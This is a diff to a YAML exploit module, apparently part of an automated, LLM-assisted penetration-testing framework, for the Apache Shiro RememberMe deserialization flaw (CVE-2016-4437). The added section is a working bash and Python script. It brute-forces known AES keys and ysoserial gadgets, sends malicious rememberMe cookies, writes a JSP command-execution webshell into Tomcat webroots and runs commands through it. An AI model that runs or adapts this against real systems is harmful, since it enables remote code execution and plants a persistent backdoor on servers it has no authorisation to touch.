@@ -1,19 +1,15 @@
 # ═══════════════════════════════════════════════════════════
-# Apache Shiro RememberMe 反序列化 RCE (CVE-2016-4437) v4
+# Apache Shiro RememberMe 反序列化 RCE (CVE-2016-4437) v5
 #
-# 原理: Shiro 用 AES 密钥加密 RememberMe Cookie 中的序列化对象
-#       攻击者用已知密钥 + ysoserial gadget 构造恶意 Cookie → RCE
-#
-# v4 改进:
-#   - 回调检测替代 deleteMe 判断（deleteMe 机制不可靠）
-#   - shiro_exploit.py v2 内置回调爆破
-#   - Python AES 替代 Java 编译加密
-#   - JDK 8 只用于 ysoserial payload 生成
+# v5 改进:
+#   - Dockerfile 添加 pycryptodome（修复 AES 加密失败的根因）
+#   - SkillEngine 传递 task_id（命令在持久容器中执行）
+#   - 新增 NAT 路径: 无回调环境下通过写 webshell 验证 RCE
 # ═══════════════════════════════════════════════════════════
 skill_id: shiro_rce
 name: "Apache Shiro RememberMe 反序列化 RCE"
 category: java_deserialization
-version: "4.0"
+version: "5.0"
 
 principle: |
   Apache Shiro 的 RememberMe 功能使用 AES 加密序列化的用户身份信息。
@@ -22,16 +18,14 @@ principle: |
   - Shiro 1.2.4 及更早版本使用硬编码 AES 密钥 kPH+bIxk5D2deZiIxcaaaA==
   - 大量项目使用了其他已知/泄露的密钥
 
-  检测难点（为什么不用 deleteMe 判断）：
-  - 密钥错误 → 解密失败 → 返回 deleteMe
-  - 密钥正确但 gadget 异常 → 反序列化抛异常 → 也返回 deleteMe
-  - CB1 gadget 执行命令是副作用，异常后 Shiro 仍设 deleteMe
-  - 所以 deleteMe 不能区分"密钥错误"和"密钥正确但 gadget 异常"
+  利用方式：
+  - 用 ysoserial (JDK 8) 生成 CommonsBeanutils1 gadget payload
+  - AES-CBC 加密 → Base64 → rememberMe Cookie
+  - 目标反序列化执行命令
 
-  正确方法：网络回调检测
-  - 用 ysoserial 生成 "curl http://LHOST:PORT/shiro" payload
-  - AES 加密后发送，目标执行 curl 回连
-  - 监听器收到回调 = RCE 确认
+  检测方式：
+  - 方式 A（推荐）: 回调检测 — 命令回连攻击机，确认 RCE
+  - 方式 B（NAT）: 写 webshell — 命令写 JSP 到 webroot，HTTP 访问验证
 
   关键约束：ysoserial 必须用 JDK 8 运行。
 
@@ -87,8 +81,24 @@ probes:
       - if_contains: ["JAVA8_MISSING"]
         set: { java8_available: false }
 
+  - id: check_lhost
+    description: "检查 LHOST 环境变量是否可用于回调"
+    depends_on: { shiro_confirmed: true }
+    command: |
+      if [ -n "$LHOST" ] && [ "$LHOST" != "127.0.0.1" ] && [ "$LHOST" != "0.0.0.0" ] && [ "$LHOST" != "localhost" ]; then
+        echo "LHOST_AVAILABLE=$LHOST"
+      else
+        echo "LHOST_UNAVAILABLE"
+      fi
+    timeout: 5
+    parse_rules:
+      - if_contains: ["LHOST_AVAILABLE"]
+        set: { lhost_available: true }
+      - if_contains: ["LHOST_UNAVAILABLE"]
+        set: { lhost_available: false }
+
 exploit_paths:
-  # ═══ 路径 A: shiro_exploit.py v2 回调检测 ═══
+  # ═══ 路径 A: 回调检测爆破（需要 LHOST）═══
   - path_id: shiro_callback
     name: "shiro_exploit.py 回调检测"
     priority: 1
@@ -98,10 +108,9 @@ exploit_paths:
       2. 启动 HTTP 回调监听器
       3. 遍历 密钥×gadget 组合，发送加密 Cookie
       4. 收到回调即确认 RCE
-
-      需要 LHOST 环境变量（攻击机公网 IP）和端口映射。
     conditions:
       shiro_confirmed: true
+      lhost_available: true
     steps:
       - id: shiro_exploit
         description: "回调检测爆破（密钥×gadget 自动遍历）"
@@ -117,7 +126,189 @@ exploit_paths:
         evidence_capture:
           shell_type: "rce_shiro_callback"
 
-  # ═══ 路径 B: LLM 兜底 ═══
+  # ═══ 路径 B: 写 webshell 验证（NAT 环境无回调）═══
+  - path_id: shiro_webshell
+    name: "Shiro 写 webshell 验证 RCE（NAT 环境）"
+    priority: 10
+    principle: |
+      无回调环境下:
+      1. 用 ysoserial 生成 payload，命令为写 JSP webshell 到 webroot
+      2. 遍历 密钥×gadget 组合发送
+      3. HTTP 访问 webshell 路径验证是否写入成功
+    conditions:
+      shiro_confirmed: true
+    steps:
+      - id: shiro_write_shell
+        description: "遍历密钥+gadget 写 webshell，HTTP 验证"
+        command: |
+          #!/bin/bash
+          set -e
+
+          ENDPOINT="{ENDPOINT}"
+          TARGET_IP="{TARGET_IP}"
+          TARGET_PORT="{TARGET_PORT}"
+
+          # JDK 8 路径
+          JAVA8=""
+          for p in /usr/lib/jvm/java-8/bin/java /usr/lib/jvm/java-8-openjdk-amd64/bin/java; do
+            [ -x "$p" ] && JAVA8="$p" && break
+          done
+          if [ -z "$JAVA8" ]; then echo "[-] JDK 8 不可用"; exit 1; fi
+
+          # AES 检测
+          python3 -c "from Crypto.Cipher import AES; print('pycryptodome OK')" 2>/dev/null \
+            || python3 -c "from cryptography.hazmat.primitives.ciphers import Cipher; print('cryptography OK')" 2>/dev/null \
+            || { echo "[-] 无 AES 加密库"; exit 1; }
+
+          # Webshell 内容
+          SHELL_JSP='<%@page import="java.io.*"%><%Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=br.readLine())!=null)out.println(l);%>'
+          SHELL_NAME="shiro_test_$(date +%s).jsp"
+          
+          # 常见 Tomcat webroot 路径
+          WEBROOT_PATHS=(
+            "/opt/tomcat/webapps/ROOT"
+            "/usr/local/tomcat/webapps/ROOT"
+            "/var/lib/tomcat/webapps/ROOT"
+            "/var/lib/tomcat8/webapps/ROOT"
+            "/var/lib/tomcat9/webapps/ROOT"
+          )
+
+          # 常见密钥（Top 10）
+          KEYS=(
+            "kPH+bIxk5D2deZiIxcaaaA=="
+            "4AvVhmFLUs0KTA3Kprsdag=="
+            "3AvVhmFLUs0KTA3Kprsdag=="
+            "2AvVhdsgUs0FSA3SDFAdag=="
+            "Z3VucwAAAAAAAAAAAAAAAA=="
+            "wGiHplamyXlVB11UXWol8g=="
+            "fCq+/xW488hMTCD+cmJ3aQ=="
+            "0AvVhmFLUs0KTA3Kprsdag=="
+            "1QWLxg+NYmxraMoxAXu/Iw=="
+            "ZnJhbWUxLjYuMA=="
+          )
+
+          GADGETS=("CommonsBeanutils1" "CommonsCollections2" "CommonsCollections6")
+
+          echo "[*] 开始 Shiro 写 webshell 爆破"
+          echo "[*] 密钥: ${#KEYS[@]} 个, Gadget: ${#GADGETS[@]} 个"
+
+          TESTED=0
+          for gadget in "${GADGETS[@]}"; do
+            # 预生成各路径的写文件命令 payload
+            for webroot in "${WEBROOT_PATHS[@]}"; do
+              WRITE_CMD="bash -c {echo,${SHELL_JSP// /}|base64 -d > ${webroot}/${SHELL_NAME}}"
+              # 实际用 bash 写文件的命令
+              WRITE_CMD_REAL="/bin/bash -c echo+'${SHELL_JSP}'+>+'${webroot}/${SHELL_NAME}'"
+              
+              # 更可靠的写法：用 python 生成 payload 并加密发送
+              for key in "${KEYS[@]}"; do
+                TESTED=$((TESTED + 1))
+
+                python3 -c "
+          import subprocess, base64, os, sys
+          # 生成 ysoserial payload
+          cmd = 'bash -c {echo,$(echo -n \"${SHELL_JSP}\" | base64 | tr -d \"\\n\")}|{base64,-d}|{tee,${webroot}/${SHELL_NAME}}'
+          proc = subprocess.run(
+              ['${JAVA8}', '-jar', '/opt/ysoserial.jar', '${gadget}', cmd],
+              capture_output=True, timeout=15
+          )
+          if proc.returncode != 0 or len(proc.stdout) < 50:
+              sys.exit(1)
+          payload = proc.stdout
+
+          # AES-CBC 加密
+          key = base64.b64decode('${key}')
+          iv = os.urandom(16)
+          pad_len = 16 - (len(payload) % 16)
+          padded = payload + bytes([pad_len] * pad_len)
+          try:
+              from Crypto.Cipher import AES
+              ct = AES.new(key, AES.MODE_CBC, iv).encrypt(padded)
+          except ImportError:
+              from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+              c = Cipher(algorithms.AES(key), modes.CBC(iv))
+              enc = c.encryptor()
+              ct = enc.update(padded) + enc.finalize()
+          cookie = base64.b64encode(iv + ct).decode()
+          print(cookie)
+          " 2>/dev/null
+                COOKIE=$(python3 -c "
+          import subprocess, base64, os, sys
+          cmd = '/bin/bash####-c####echo ${SHELL_JSP} > ${webroot}/${SHELL_NAME}'.replace('####', chr(32))
+          proc = subprocess.run(
+              ['${JAVA8}', '-jar', '/opt/ysoserial.jar', '${gadget}', cmd],
+              capture_output=True, timeout=15
+          )
+          if proc.returncode != 0 or len(proc.stdout) < 50:
+              sys.exit(1)
+          payload = proc.stdout
+          key = base64.b64decode('${key}')
+          iv = os.urandom(16)
+          pad_len = 16 - (len(payload) % 16)
+          padded = payload + bytes([pad_len] * pad_len)
+          try:
+              from Crypto.Cipher import AES
+              ct = AES.new(key, AES.MODE_CBC, iv).encrypt(padded)
+          except ImportError:
+              from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+              c = Cipher(algorithms.AES(key), modes.CBC(iv))
+              enc = c.encryptor()
+              ct = enc.update(padded) + enc.finalize()
+          print(base64.b64encode(iv + ct).decode())
+          " 2>/dev/null)
+
+                if [ -z "$COOKIE" ]; then continue; fi
+
+                # 发送
+                curl -s -o /dev/null "${ENDPOINT}" \
+                  -H "Cookie: rememberMe=${COOKIE}" \
+                  --max-time 8 2>/dev/null || true
+
+                # 每 5 组合检查一次 webshell
+                if [ $((TESTED % 5)) -eq 0 ]; then
+                  sleep 1
+                  RESP=$(curl -s "${ENDPOINT}/${SHELL_NAME}?cmd=id" --max-time 5 2>/dev/null || true)
+                  if echo "$RESP" | grep -q "uid="; then
+                    echo ""
+                    echo "=============================="
+                    echo "SHIRO_RCE_CONFIRMED"
+                    echo "SHIRO_KEY=${key}"
+                    echo "SHIRO_GADGET=${gadget}"
+                    echo "SHIRO_WEBROOT=${webroot}"
+                    echo "SHIRO_SHELL=${ENDPOINT}/${SHELL_NAME}?cmd=id"
+                    echo "OUTPUT: $RESP"
+                    echo "=============================="
+                    exit 0
+                  fi
+                fi
+
+                [ $((TESTED % 20)) -eq 0 ] && echo "    进度: $TESTED (${gadget} × ${key:0:12}...)"
+              done
+
+              # 每个 webroot 路径试完检查一次
+              sleep 1
+              RESP=$(curl -s "${ENDPOINT}/${SHELL_NAME}?cmd=id" --max-time 5 2>/dev/null || true)
+              if echo "$RESP" | grep -q "uid="; then
+                echo ""
+                echo "SHIRO_RCE_CONFIRMED"
+                echo "SHIRO_WEBROOT=${webroot}"
+                echo "OUTPUT: $RESP"
+                exit 0
+              fi
+            done
+          done
+
+          echo "[-] 全部 $TESTED 组合测试完毕，未写入 webshell"
+          echo "ALL_FAILED"
+        timeout: 600
+        success_criteria:
+          stdout_contains_any: ["SHIRO_RCE_CONFIRMED"]
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "rce_shiro_webshell"
+
+  # ═══ 路径 C: LLM 兜底 ═══
   - path_id: llm_freeform
     name: "LLM 自由推理（限定 Shiro 漏洞范围）"
     priority: 99
